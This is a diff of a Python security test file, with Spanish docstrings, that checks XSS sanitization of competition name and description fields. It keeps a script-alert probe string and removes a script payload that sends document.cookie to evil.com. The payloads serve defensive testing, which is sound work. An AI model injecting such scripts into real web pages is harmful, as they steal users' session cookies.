@@ -90,7 +90,7 @@ class TestXSSInCompetitionFields:
         When: Se crea una competición con nombre malicioso
         Then: El nombre debe ser sanitizado
         """
-        client, user_data = authenticated_client
+        client, _user_data = authenticated_client
 
         xss_name = "<script>alert('Hacked')</script>Ryder Cup"
 
@@ -125,15 +125,8 @@ class TestXSSInCompetitionFields:
         NOTE: Este test asume que existe un campo description.
         Si no existe, el test pasará documentando el comportamiento esperado.
         """
-        client, user_data = authenticated_client
+        client, _user_data = authenticated_client
 
-        malicious_description = """
-        <p>This is a competition</p>
-        <script>
-            // Steal cookies
-            fetch('http://evil.com/steal?cookie=' + document.cookie);
-        </script>
-        """
 
         competition_data = {
             "name": "Test Competition",
